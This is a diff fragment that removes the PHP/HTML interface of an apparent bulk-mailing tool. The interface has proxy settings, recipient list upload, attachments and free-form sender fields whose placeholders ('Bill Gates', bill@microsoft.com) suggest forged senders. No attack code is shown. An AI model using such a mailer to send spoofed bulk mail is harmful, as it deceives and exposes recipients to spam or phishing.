-						<button type="button" class="btn btn-danger btn-checkbox" data-toggle="#use_proxy_server"><i class="icon-remove"></i></button> <?php tr('settings-security-use-proxy')?><br>
-						<input type="text" class="txtinput" id="proxy_server_uri" placeholder="http://proxyserver.ru:8080">
-					</div>
-				</div>
-			</div>
-		</div>
-	</div>
-
-		
-	<div class="row section-screen" id="prime-screen">
-		<div class="span3">
-			<div id="console" class="well" style="text-align:center;"><?php tr('status');?></div>
-			<div id="ext-console" class="well"></div>	
-		</div>
-		<div class="span9">
-			<div class="progress" id="progressbar">
-		    	<div class="bar bar-warning" style="width: 0%;"></div>
-		    	<div class="barcounter">0/0</div>
-		    </div>
-		    <div class="well status">
-			    <b><?php tr('status');?>: <span class="label label-warning"><?php tr('status-idle');?></span></b>
-		    	<div class="controls">
-		    	<button class="btn" disabled="disabled" id="ResumeSendMail" onclick="ResumeSendMail()"><i class="icon-play"></i> <?php tr('process-resume');?></button> <button class="btn" disabled="disabled" id="PauseSendMail" onclick="PauseSendMail()"><i class="icon-pause"></i> <?php tr('process-pause');?></button> <button class="btn" disabled="disabled" id="StopSendMail" onclick="StopSendMail()"><i class="icon-stop"></i> <?php tr('process-cancel');?></button>  
-		    	</div>
-		    </div>
-		    <form class="form-horizontal">
-				<div class="control-group">
-					<label class="control-label" for="inputEmail"><?php tr('recipient');?> [TO-EMAIL]</label>
-					<div class="controls">
-						<textarea name="to" id="to" class="input-xlarge txtinput" placeholder="vasya@yandex.ru"></textarea>
-						<div class="input-append">
-							<span class="add-on" onclick="ShowUpload();return false" style="cursor:pointer;"><?php tr('upload');?></span>
-						</div>
-					</div>
-				</div>
-				<div class="control-group">
-					<label class="control-label" for="inputEmail"><?php tr('fromname');?> [FROM-NAME]</label>
-					<div class="controls">
-						<textarea name="fromname" id="fromname" class="input-xlarge txtinput" placeholder="Bill Gates"></textarea>
-					</div>
-				</div>
-				<div class="control-group">
-					<label class="control-label" for="inputEmail"><?php tr('frommail');?> [FROM-EMAIL]</label>
-					<div class="controls">
-						<textarea name="frommail" id="frommail" class="input-xlarge txtinput" placeholder="bill@microsoft.com"></textarea>
-					</div>
-				</div>
-				<div class="control-group">
-					<label class="control-label" for="inputEmail"><?php tr('replymail');?> [REPLY-EMAIL]</label>
-					<div class="controls">
-						<textarea name="replymail" id="replymail" class="input-xlarge txtinput" placeholder="my@email.com"></textarea>
-					</div>
-				</div>
-				<div class="control-group">
-					<label class="control-label" for="inputEmail"><?php tr('subject');?> [THEME]</label>
-					<div class="controls">
-						<textarea name="tema" id="tema" class="input-xlarge txtinput" placeholder="<?php tr('subject_example',false);?>"></textarea>
-					</div>
-				</div>
-				<div class="control-group">
-					<label class="control-label" for="inputEmail"><?php tr('addfield');?></label>
-					<div class="controls">
-						<div class="input-prepend">
-							<span class="add-on">[ADD0]</span>
-						</div>
-						<input type="text" name="additional" id="additional0" class="input-xlarge txtinput additional" placeholder="<?php tr('addfield2',false);?>"></textarea>
-						<div class="input-append">
-							<span class="add-on"><span class="addfield" onclick="AddField(this)">+</span></span>
-						</div>
-					</div>
-				</div>
-				<div class="control-group">
-					<label class="control-label" for="inputEmail"><?php tr('mailtype');?> (
-						<a href="#" rel="tooltip" data-title="<?php tr('plaintext',false);?>">text</a>, 
-						<a href="#" rel="tooltip" data-title="<?php tr('withformating',false);?>">html</a>, 
-						<a href="#" rel="tooltip" data-title="<?php tr('htmle',false);?>">html(e)</a>)
-					</label>
-					<div class="controls">
-						<select name="type" id="type">
-							<option value="html">html</option>
-							<option value="htmle">html(e)</option>
-							<option value="text">text</option>
-						</select>
-					</div>
-				</div>
-				
-				
-				<div class="btn-group" id="textcontrols">
-				    <button id="makebold" onclick="MakeBold();return false" class="btn">B</button>
-				    <button id="makeitalic" onclick="MakeItalic();return false" class="btn">I</button>
-				    <button id="makeunderline" onclick="MakeUnderline();return false" class="btn">U</button>
-				    <button id="makereverse" onclick="MakeReverse();return false" class="btn">esreveR</button>
-			    </div>
-				<textarea name="text" id="text" style="width:100%;height:200px;"></textarea>
-				<button class="btn" onclick="showUniversalUpload();return false"><i class="icon-plus"></i> <?php tr('attachfile');?></button>
-				<span id="attachedFiles" class="pull-right"></span>
-			</form>
-			<div class="pull-left">
-				<button class="btn btn-large" onclick="SaveData()"><?php tr('save');?></a>
-				<button class="btn btn-large" onclick="TogleLoadSave()"><?php tr('load');?></a>
-			</div>
-			<div class="pull-right">
-				<button class="btn btn-large btn-primary" onclick="Send()"><?php tr('send');?></a>
-				<button class="btn btn-large" onclick="Preview()"><?php tr('preview');?></a>
-			</div>
-		</div>
-	</div>
-	<div class="row">
-		<div class="span12">
-			<div class="well" style="text-align:center;">
-			&copy; <a href="http://mailer.a-l-e-x-u-s.ru/" target="_blank">Alexus</a> <?php echo date("Y");?>
-		</div>
-	</di>
-</div>
-<script src="http://netdna.bootstrapcdn.com/twitter-bootstrap/2.3.0/js/bootstrap.min.js"></script>
-</body>
-</html>
+?>
